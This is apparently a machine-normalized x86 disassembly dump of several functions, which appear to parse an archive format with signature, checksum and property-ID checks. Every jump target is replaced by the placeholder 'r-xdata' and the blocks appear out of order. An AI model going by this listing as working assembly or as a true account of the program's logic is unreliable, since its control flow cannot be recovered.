mov eax [ ebp - 0x8 ]
mov ecx [ ebx ]
movzx eax [ eax + edx ]
mov [ ecx + edi + 0x1c ] eax
mov eax [ ebp - 0x4 ]
lea edi [ edi + 0x28 ]
mov eax [ eax + edx * 4 ]
mov [ ecx + edi - 0x8 ] eax
inc edx
cmp edx [ esi ]
jb r-xdata
mov edi [ ebp - 0x18 ]
mov ebx [ ebp + 0x10 ]
sub_404d65
push ebp
mov ebp esp
sub esp 0x44
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x1c ] 0x0
push ebx
push esi
mov esi ecx
xorps xmm0 xmm0
push edi
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] esi
movlpd [ ebp - 0x30 ] xmm0
test edx edx
je r-xdata
mov ebx [ ebp + 0xc ]
mov ecx esi
mov [ ebx ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x24
mov ecx edx
lea edx [ ebp - 0x30 ]
call sub_404357
test eax eax
je r-xdata
mov [ eax ] 0x1
lea eax [ eax + 0x28 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x30 ]
mov edi [ ebp - 0x2c ]
cmp esi 0xd
jne r-xdata
jmp r-xdata
cmp esi 0xa
jne r-xdata
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0x9
jne r-xdata
test edi edi
je r-xdata
and [ ebx ] edi
xor esi esi
cmp [ ebp - 0xc ] esi
jbe r-xdata
mov eax esi
or eax edi
je r-xdata
test edi edi
je r-xdata
mov eax [ ebx ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edi [ ebp + 0x8 ]
add edi 0x24
mov ecx [ ebp - 0x4 ]
call sub_40443c
test eax eax
jne r-xdata
shl eax 0x3
push eax
mov eax [ ebp + 0x1c ]
push eax
call [ eax ]
pop ecx
pop ecx
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
and [ eax ] 0x0
mov eax [ ebp + 0x14 ]
and [ eax ] 0x0
mov eax [ ebp + 0x18 ]
and [ eax ] 0x0
jmp r-xdata
mov eax [ ebp - 0x24 ]
add [ ebx ] eax
mov [ edi ] eax
inc esi
add edi 0x28
cmp esi [ ebp - 0xc ]
jb r-xdata
push [ ebx ]
mov eax [ ebp + 0x1c ]
push eax
call [ eax ]
pop ecx
pop ecx
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
test eax eax
je r-xdata
push 0x2
pop eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ ebp - 0x24 ] 0x0
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x24 ]
call sub_4043da
test eax eax
jne r-xdata
jmp r-xdata
mov eax [ ebx ]
shl eax 0x2
push eax
mov eax [ ebp + 0x1c ]
push eax
call [ eax ]
pop ecx
pop ecx
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
test eax eax
je r-xdata
cmp esi 0x9
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebx ]
xor eax eax
test edx edx
je r-xdata
test edi edi
jne r-xdata
mov edx [ ebp - 0x24 ]
inc edx
add ecx 0x28
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x18 ] ecx
cmp edx eax
jb r-xdata
cmp esi 0x9
jne r-xdata
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
mov ecx [ ebp + 0x18 ]
mov ebx [ ebp + 0x14 ]
mov ecx [ ecx ]
mov ebx [ ebx ]
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x30 ]
call sub_404357
test eax eax
jne r-xdata
mov edx [ ecx + 0x24 ]
xorps xmm0 xmm0
movlpd [ ebp - 0x38 ] xmm0
mov [ ebp - 0x28 ] edx
test edx edx
je r-xdata
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x10 ] eax
test edi edi
jne r-xdata
and [ ebp + 0xc ] 0x0
mov eax [ ebp + 0x8 ]
mov edi [ ebp - 0x1c ]
add eax 0x1c
mov ecx ebx
mov [ ebx + eax ] 0x0
and [ ecx ] 0x0
inc eax
lea ecx [ ecx + 0x4 ]
cmp eax edx
jb r-xdata
mov edi [ ebp - 0x2c ]
mov esi [ ebp - 0x30 ]
xor eax eax
inc eax
cmp edx eax
jbe r-xdata
or esi edi
je r-xdata
test edi edi
jne r-xdata
add edi [ eax + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x10 ] ecx
xor eax eax
mov ecx [ ebp - 0x4 ]
call sub_40443c
test eax eax
jne r-xdata
and [ ebp - 0x14 ] edi
and [ ebp - 0x10 ] edi
and [ ebp - 0x28 ] edi
mov edi [ ebp + 0x1c ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x4 ]
push edi
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call sub_40459d
mov esi eax
add esp 0xc
mov [ ebp - 0x20 ] esi
test esi esi
jne r-xdata
cmp [ eax + 0x8 ] 0x1
jne r-xdata
mov [ ebp - 0x1c ] edi
mov edi [ ebp - 0x2c ]
add eax 0x28
dec ecx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x40 ]
mov ebx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov [ eax + ecx * 8 ] edx
mov ecx [ ebp - 0x3c ]
mov [ eax + ebx * 8 + 0x4 ] ecx
mov eax [ ebp - 0x20 ]
mov ebx [ ebp + 0xc ]
inc eax
add [ ebp - 0x10 ] edx
mov [ ebp - 0x20 ] eax
adc [ ebp - 0x14 ] ecx
cmp eax [ ebp - 0x28 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x30 ]
call sub_404357
test eax eax
jne r-xdata
push [ ebp - 0x14 ]
push edi
call [ edi + 0x4 ]
push [ ebp - 0x10 ]
push edi
call [ edi + 0x4 ]
add esp 0x10
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x40 ]
call sub_404357
test eax eax
jne r-xdata
mov ecx [ ebp - 0x18 ]
jmp r-xdata
mov edi [ ebp - 0x2c ]
mov esi [ ebp - 0x30 ]
jmp r-xdata
mov eax esi
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov edi [ ebp - 0x28 ]
add edx 0x1c
mov eax ebx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x18 ] eax
call sub_404019
sub eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp - 0x8 ]
mov ecx [ ecx ]
sbb edx [ ebp - 0x14 ]
mov [ ecx + edi * 8 ] eax
mov eax edi
mov edi [ ebp - 0x2c ]
mov [ ecx + eax * 8 + 0x4 ] edx
mov ecx [ ebp - 0x18 ]
inc eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
cmp esi 0xa
jne r-xdata
test ecx ecx
je r-xdata
cmp [ edx ] 0x0
je r-xdata
add edx 0x28
dec eax
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ ebp + 0x18 ]
mov esi [ ebp + 0xc ]
mov eax [ eax ]
lea ebx [ eax + esi * 4 ]
mov eax [ ebp + 0x14 ]
mov eax [ eax ]
mov edx eax
mov eax [ ebp + 0x14 ]
mov esi [ ebp + 0xc ]
mov eax [ eax ]
mov [ esi + eax ] cl
mov eax [ ebp + 0x18 ]
mov ecx [ eax ]
mov eax [ edx + 0x4 ]
mov [ ecx + esi * 4 ] eax
inc esi
jmp r-xdata
mov ecx [ edx + 0x8 ]
cmp ecx 0x1
jne r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp + 0x1c ]
mov esi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov al [ eax + edi ]
mov [ edx + esi ] al
mov eax [ ebp - 0x10 ]
inc esi
mov eax [ eax + edi * 4 ]
inc edi
mov [ ebx ] eax
lea ebx [ ebx + 0x4 ]
dec ecx
jne r-xdata
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x18 ]
mov [ ebp + 0xc ] esi
sub_4050ed
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov ebx edx
push edi
lea edx [ ebp - 0x8 ]
mov edi ecx
call sub_404357
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov esi [ ebp + 0x8 ]
push 0x4
pop eax
cmp edx [ ebp - 0x4 ]
jne r-xdata
sub ecx 0x0
je r-xdata
xor eax eax
jmp r-xdata
sub ecx 0x6
je r-xdata
push [ ebp + 0x1c ]
lea eax [ esi + 0x8 ]
push eax
lea eax [ esi + 0x4 ]
push eax
lea eax [ esi + 0x14 ]
push esi
push eax
mov edx ebx
mov ecx edi
call sub_40460d
add esp 0x14
dec ecx
je r-xdata
lea edx [ ebp - 0x8 ]
mov ecx edi
call sub_404357
test eax eax
je r-xdata
push [ ebp + 0x20 ]
lea eax [ esi + 0xc ]
push [ ebp + 0x1c ]
lea edx [ esi + 0x18 ]
push eax
mov ecx edi
call sub_404b30
add esp 0xc
jmp r-xdata
dec ecx
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov eax ecx
cdq
cmp eax ecx
jne r-xdata
jmp r-xdata
test eax eax
jne r-xdata
push [ ebp + 0x20 ]
mov edx [ esi + 0x18 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esi + 0xc ]
call sub_404d65
add esp 0x18
jmp r-xdata
sub_4051ad
push ebp
mov ebp esp
mov eax [ ecx + 0x40 ]
push esi
mov esi [ eax + edx * 4 + 0x4 ]
push edi
mov edi [ eax + edx * 4 ]
mov edx [ ebp + 0x8 ]
sub esi edi
test edx edx
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn
mov eax [ ecx + 0x44 ]
lea eax [ eax + edi * 2 ]
test esi esi
je r-xdata
sub eax edx
mov edi esi
mov cx [ eax + edx ]
mov [ edx ] cx
lea edx [ edx + 0x2 ]
dec edi
jne r-xdata
sub_4051e6
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
mov esi edx
xor eax eax
mov ebx ecx
push edi
lea edx [ ebp - 0x18 ]
mov ecx esi
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] eax
call sub_404357
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
cmp edx 0x2
jne r-xdata
cmp edx 0x4
jne r-xdata
test ecx ecx
jne r-xdata
mov eax edx
or eax ecx
je r-xdata
test ecx ecx
jne r-xdata
jmp r-xdata
cmp edx 0x5
jne r-xdata
push [ ebp + 0x24 ]
lea eax [ ebp - 0x1c ]
push [ ebp + 0x20 ]
lea edx [ ebx + 0x28 ]
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
push ebx
call sub_4050ed
add esp 0x1c
test eax eax
jne r-xdata
lea edx [ ebp - 0x30 ]
mov ecx esi
call sub_404357
test eax eax
je r-xdata
push 0x10
test ecx ecx
jne r-xdata
mov eax [ ebx + 0x20 ]
add [ ebx + 0x28 ] eax
mov eax [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
adc [ ebx + 0x2c ] eax
mov ecx esi
call sub_404357
test eax eax
jne r-xdata
mov eax [ ebp - 0x30 ]
or eax [ ebp - 0x2c ]
je r-xdata
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov ecx esi
call sub_4043da
test eax eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
xor eax eax
mov ecx esi
call sub_40443c
test eax eax
jne r-xdata
mov ebx [ ebp - 0x4 ]
mov edi [ ebp - 0x8 ]
mov [ edi + 0x1c ] ebx
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x18 ]
mov ecx esi
call sub_404357
test eax eax
jne r-xdata
mov eax [ ebp + 0x20 ]
mov ecx ebx
shl ecx 0x5
push ecx
push eax
call [ eax ]
pop ecx
pop ecx
mov [ ebp - 0xc ] eax
test eax eax
jne r-xdata
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov [ edi + 0x10 ] eax
test ebx ebx
je r-xdata
push 0x2
jmp r-xdata
lea edx [ ebp - 0x30 ]
mov ecx esi
call sub_404357
test eax eax
je r-xdata
add eax 0x19
mov ecx ebx
pop eax
mov edi [ ebp - 0x30 ]
mov eax edi
or eax [ ebp - 0x2c ]
je r-xdata
jmp r-xdata
mov [ eax - 0x1 ] 0x1
mov [ eax + 0x3 ] 0x0
lea eax [ eax + 0x20 ]
dec ecx
jne r-xdata
jmp r-xdata
xor ecx ecx
xor edi edi
xor esi esi
mov [ ebp - 0x1c ] ecx
test ebx ebx
je r-xdata
lea edx [ ebp - 0x28 ]
mov ecx esi
call sub_404357
test eax eax
jne r-xdata
mov edx [ ebp + 0x20 ]
mov ecx [ ebp - 0x8 ]
call sub_404157
jmp r-xdata
mov edx [ ebp - 0xc ]
add edx 0x18
cmp [ ebp - 0x24 ] eax
ja r-xdata
cmp [ eax + esi ] 0x0
sete al
mov [ edx ] al
test al al
je r-xdata
mov [ edx ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x28 ]
jb r-xdata
mov eax [ ebp + 0x18 ]
mov eax [ eax ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx + 0x1 ] 0x0
mov ecx [ eax ]
mov eax [ ecx + edi * 8 ]
mov [ edx - 0x10 ] eax
mov eax [ ecx + edi * 8 + 0x4 ]
mov ecx [ ebp - 0x1c ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
mov eax [ eax + edi * 4 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov al [ edi + eax ]
mov [ edx + 0x3 ] al
inc edi
jmp r-xdata
mov eax edi
cdq
cmp eax edi
jne r-xdata
cmp ecx [ esi + 0x4 ]
ja r-xdata
cmp [ eax + ecx ] 0x0
sete al
mov [ edx + 0x1 ] al
mov [ edx + 0x1 ] 0x1
jmp r-xdata
inc esi
add edx 0x20
cmp esi ebx
jb r-xdata
push [ ebp - 0x24 ]
push ecx
cmp edx [ ebp - 0x2c ]
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ edx + 0x2 ] 0x0
mov eax [ eax ]
test eax eax
jne r-xdata
and [ edx - 0x10 ] 0x0
and [ edx - 0xc ] 0x0
inc ecx
and [ edx - 0x8 ] 0x0
mov [ ebp - 0x1c ] ecx
mov [ edx + 0x3 ] 0x0
sub edi 0xe
je r-xdata
push [ ebp + 0x24 ]
mov edi [ ebp + 0x14 ]
push edi
mov edx ebx
mov ecx esi
call sub_4044b4
pop ecx
pop ecx
test eax eax
jne r-xdata
dec edi
je r-xdata
xor edx edx
mov [ ebp - 0x10 ] edx
test ebx ebx
je r-xdata
push [ ebp + 0x24 ]
mov edx [ ebp - 0x10 ]
push [ ebp + 0x18 ]
mov ecx esi
call sub_4044b4
pop ecx
pop ecx
jmp r-xdata
dec edi
dec edi
je r-xdata
mov ecx [ edi ]
test eax eax
jne r-xdata
mov ecx esi
call sub_40474e
test eax eax
jne r-xdata
sub edi 0x3
je r-xdata
inc eax
cmp eax ebx
jb r-xdata
inc edx
mov eax [ ebp - 0x28 ]
dec eax
mov [ ebp - 0x14 ] eax
test al 0x1
jne r-xdata
push [ ebp + 0x24 ]
mov edi [ ebp + 0x1c ]
push edi
mov edx ebx
mov ecx esi
call sub_404538
pop ecx
pop ecx
test eax eax
jne r-xdata
dec edi
jne r-xdata
cmp [ ecx + eax ] 0x0
je r-xdata
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov edi [ ebp - 0x8 ]
push [ ebp + 0x20 ]
lea ecx [ edi + 0x44 ]
mov edx eax
call sub_403348
pop ecx
test eax eax
je r-xdata
mov ecx esi
call sub_40474e
test eax eax
jne r-xdata
push [ ebp + 0x24 ]
mov edi [ ebp + 0x1c ]
push edi
mov edx ebx
mov ecx esi
call sub_404538
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebx + 0x1 ]
test eax eax
jne r-xdata
xor ecx ecx
mov [ ebp - 0x14 ] ecx
test ebx ebx
je r-xdata
mov ecx esi
call sub_40474e
test eax eax
jne r-xdata
lea eax [ ebx * 4 + 0x4 ]
push eax
mov eax [ ebp + 0x20 ]
push eax
call [ eax ]
pop ecx
pop ecx
mov [ edi + 0x40 ] eax
test eax eax
je r-xdata
and [ edi + 0x40 ] eax
jmp r-xdata
push [ edi ]
mov eax [ ebp + 0x24 ]
push eax
call [ eax + 0x4 ]
and [ edi ] 0x0
pop ecx
pop ecx
jmp r-xdata
mov edi [ ebp - 0xc ]
add edi 0x4
xor ecx ecx
mov [ ebp - 0x14 ] ecx
test ebx ebx
je r-xdata
mov edi [ ebp - 0x14 ]
mov eax [ esi ]
push edi
push eax
mov eax [ ebp - 0x8 ]
push [ eax + 0x44 ]
call sub_410100
mov eax [ ebp - 0x8 ]
mov edx edi
mov eax [ eax + 0x40 ]
mov [ ebp - 0x1c ] eax
add esp 0xc
shr edx 0x1
xor ecx ecx
xor eax eax
test ebx ebx
je r-xdata
inc ecx
add edi 0x20
mov [ ebp - 0x14 ] ecx
cmp ecx ebx
jb r-xdata
mov ecx esi
call sub_404321
test eax eax
jne r-xdata
mov edi [ ebp - 0xc ]
add edi 0x14
mov ebx [ ebp - 0x1c ]
push 0x10
mov [ ebx + eax * 4 ] ecx
xor ebx ebx
cmp ecx edx
pop eax
cmove eax ebx
mov ebx [ ebp - 0x4 ]
test eax eax
jne r-xdata
mov ebx [ ebp - 0x1c ]
mov [ ebx + eax * 4 ] ecx
mov eax [ ebp + 0x1c ]
lea edx [ edi - 0x4 ]
mov eax [ eax ]
mov al [ ecx + eax ]
and [ edi ] 0x0
and [ edx ] 0x0
mov [ edi + 0x18 ] al
test al al
je r-xdata
jmp r-xdata
mov edx edi
mov ecx esi
call sub_404321
test eax eax
jne r-xdata
inc ecx
add edi 0x20
mov [ ebp - 0x14 ] ecx
cmp ecx ebx
jb r-xdata
mov edx edi
mov ecx esi
call sub_404321
test eax eax
jne r-xdata
push 0x0
push edi
jmp r-xdata
mov edi [ esi ]
cmp [ edi + ecx * 2 ] 0x0
mov edi [ ebp - 0x14 ]
jne r-xdata
mov edi [ ebp + 0x1c ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp + 0x1c ]
mov eax [ eax ]
mov al [ ecx + eax ]
and [ edi ] 0x0
mov [ edi + 0x9 ] al
test al al
je r-xdata
mov ecx [ ebp - 0x14 ]
mov ecx esi
call sub_404417
add esp 0x8
inc ecx
jmp r-xdata
mov ebx [ esi ]
cmp [ ebx + ecx * 2 + 0x1 ] 0x0
mov ebx [ ebp - 0x4 ]
je r-xdata
cmp ecx edx
jae r-xdata
inc ecx
inc eax
cmp eax ebx
jb r-xdata
sub_4056b2
push ebp
mov ebp esp
sub esp 0x18
push esi
xor eax eax
push edi
mov edi [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_4051e6
push [ ebp - 0x4 ]
mov esi eax
push edi
call [ edi + 0x4 ]
push [ ebp - 0x8 ]
push edi
call [ edi + 0x4 ]
push [ ebp - 0xc ]
push edi
call [ edi + 0x4 ]
push [ ebp - 0x10 ]
push edi
call [ edi + 0x4 ]
add esp 0x40
push [ ebp - 0x14 ]
push edi
call [ edi + 0x4 ]
push [ ebp - 0x18 ]
push edi
call [ edi + 0x4 ]
add esp 0x10
mov eax esi
pop edi
pop esi
leave
retn
sub_40572a
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx [ ebp + 0x14 ]
and [ ebp - 0x4 ] 0x0
push esi
push edi
push [ ebp + 0x24 ]
mov [ ebp - 0x8 ] ecx
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x4 ]
push [ ebp + 0x20 ]
mov eax edx
push [ ebp + 0x1c ]
lea edx [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push ecx
push ebx
mov ecx eax
call sub_4050ed
add esp 0x1c
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov esi [ ebp - 0x10 ]
add esi [ ebp + 0xc ]
mov edi [ ebp - 0xc ]
adc edi [ ebp + 0x10 ]
cmp [ ebx + 0x18 ] 0x1
je r-xdata
mov ebx [ ebx + 0xc ]
mov ecx ebx
call sub_404019
mov ecx [ ebp - 0x8 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] edx
call sub_4062f5
pop ecx
pop ecx
test eax eax
jne r-xdata
push 0x10
push [ ebp + 0x24 ]
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_403348
pop ecx
test eax eax
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ ebp + 0x8 ]
push [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
push [ eax ]
mov edx [ edx ]
push edi
push esi
push [ ebp - 0x8 ]
mov ecx ebx
call sub_403d2f
add esp 0x18
test eax eax
jne r-xdata
push 0x2
jmp r-xdata
cmp [ ebx + 0x1c ] eax
je r-xdata
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call sub_40337a
cmp eax [ ebx + 0x20 ]
je r-xdata
push 0x3
jmp r-xdata
sub_4057fb
push ebp
mov ebp esp
sub esp 0x30
xor eax eax
push esi
push edi
mov edi [ ebp + 0x14 ]
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40572a
mov edx edi
lea ecx [ ebp - 0x2c ]
mov esi eax
call sub_404061
push [ ebp - 0x4 ]
push edi
call [ edi + 0x4 ]
push [ ebp - 0x8 ]
push edi
call [ edi + 0x4 ]
push [ ebp - 0xc ]
push edi
call [ edi + 0x4 ]
add esp 0x38
mov eax esi
pop edi
pop esi
leave
retn
sub_405872
push ebp
mov ebp esp
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x60 ] eax
push 0x1
lea eax [ ebp - 0x38 ]
mov esi edx
push eax
xorps xmm0 xmm0
push esi
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x50 ] ecx
movlpd [ ebp - 0x38 ] xmm0
call [ esi + 0xc ]
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
push 0x11
push 0x20
lea edx [ ebp - 0x24 ]
mov ecx esi
call sub_40632a
pop ecx
pop ecx
test eax eax
jne r-xdata
xor edx edx
mov ecx edx
push 0x11
inc ecx
cmp ecx 0x6
jb r-xdata
mov al [ ebp + ecx - 0x24 ]
cmp al [ ecx + rw-data ]
jne r-xdata
cmp [ ebp - 0x1e ] dl
je r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x38 ]
mov edi [ ebp - 0x18 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x34 ]
add ecx 0x20
adc eax edx
mov edx [ ebp - 0x50 ]
push 0x14
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] eax
pop edx
lea ecx [ ebp - 0x18 ]
call sub_40337a
cmp eax [ ebp - 0x1c ]
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x54 ]
cmp eax eax
jne r-xdata
push 0x3
jmp r-xdata
pop eax
push 0x2
jmp r-xdata
mov ecx [ ebp - 0x4c ]
xor edx edx
cmp edx ecx
jne r-xdata
test eax eax
je r-xdata
mov edx [ ebp - 0x58 ]
add eax edi
adc ecx edx
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x4c ] ecx
cmp edx ecx
ja r-xdata
jb r-xdata
add eax 0x20
mov [ ebp - 0x2c ] eax
mov eax ecx
push 0x0
pop ecx
adc eax ecx
cmp edx eax
ja r-xdata
cmp edi eax
ja r-xdata
jb r-xdata
push 0x2
lea eax [ ebp - 0x30 ]
push eax
xorps xmm0 xmm0
push esi
movlpd [ ebp - 0x30 ] xmm0
call [ esi + 0xc ]
add esp 0xc
test eax eax
jne r-xdata
cmp edi [ ebp - 0x2c ]
ja r-xdata
add edi [ ebp - 0x38 ]
mov edx [ ebp - 0x58 ]
adc edx [ ebp - 0x34 ]
cmp [ ebp - 0x2c ] edx
jb r-xdata
push 0x6
jmp r-xdata
ja r-xdata
push 0x0
add edi 0x20
pop eax
adc edx eax
cmp [ ebp - 0x2c ] edx
jb r-xdata
cmp [ ebp - 0x30 ] edi
jb r-xdata
ja r-xdata
mov eax [ ebp - 0x3c ]
add eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x4c ]
adc ecx [ ebp - 0x34 ]
add eax 0x20
adc ecx 0x0
cmp [ ebp - 0x2c ] ecx
jb r-xdata
cmp [ ebp - 0x30 ] edi
jb r-xdata
ja r-xdata
push edx
push edi
mov ecx esi
call sub_4062f5
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x30 ] eax
jb r-xdata
mov edi [ ebp - 0x54 ]
push ebx
mov edx edi
lea ecx [ ebp - 0x40 ]
call sub_403348
pop ecx
test eax eax
jne r-xdata
push 0x6
push edi
mov edi [ ebp - 0x40 ]
mov edx edi
mov ecx esi
call sub_40632a
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
push edi
push ebx
call [ ebx + 0x4 ]
pop ecx
pop ecx
mov eax esi
jmp r-xdata
mov edx [ ebp - 0x54 ]
push 0x10
pop esi
mov ecx edi
call sub_40337a
cmp eax [ ebp - 0x44 ]
jne r-xdata
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x30 ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x44 ] eax
call sub_404357
mov esi eax
test esi esi
jne r-xdata
mov eax [ ebp - 0x30 ]
xor ecx ecx
cmp eax 0x17
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x2c ] ecx
jne r-xdata
push 0x4
pop esi
cmp [ ebp - 0x2c ] ecx
jne r-xdata
mov eax [ ebp - 0x50 ]
push ebx
push [ eax + 0x24 ]
mov [ ebp - 0x40 ] ecx
push [ eax + 0x20 ]
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x3c ] ecx
mov ecx [ ebp - 0x5c ]
push eax
lea edx [ ebp - 0x48 ]
call sub_4057fb
mov esi eax
add esp 0x10
test esi esi
je r-xdata
mov ecx [ ebp - 0x50 ]
push ebx
push [ ebp - 0x60 ]
lea edx [ ebp - 0x48 ]
call sub_4056b2
pop ecx
pop ecx
mov esi eax
jmp r-xdata
push edi
push ebx
call [ ebx + 0x4 ]
mov eax [ ebp - 0x3c ]
mov edi [ ebp - 0x40 ]
pop ecx
pop ecx
lea edx [ ebp - 0x30 ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x44 ] eax
call sub_404357
mov esi eax
push [ ebp - 0x40 ]
push ebx
call [ ebx + 0x4 ]
pop ecx
pop ecx
jmp r-xdata
mov eax [ ebp - 0x30 ]
xor ecx ecx
test esi esi
jne r-xdata
sub_405b3c
push ebp
mov ebp esp
sub esp 0x24
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi ecx
mov ecx [ ebp + 0x18 ]
mov eax [ edi + 0x3c ]
mov [ ebp - 0x18 ] edx
mov eax [ eax + ebx * 4 ]
xor edx edx
mov esi edx
mov [ ecx ] edx
mov edx [ ebp + 0x1c ]
mov [ ebp - 0x1c ] edi
and [ edx ] esi
mov [ ebp - 0xc ] eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ ebp + 0x10 ]
mov edi [ edx ]
mov [ ebp - 0x24 ] edi
cmp edi esi
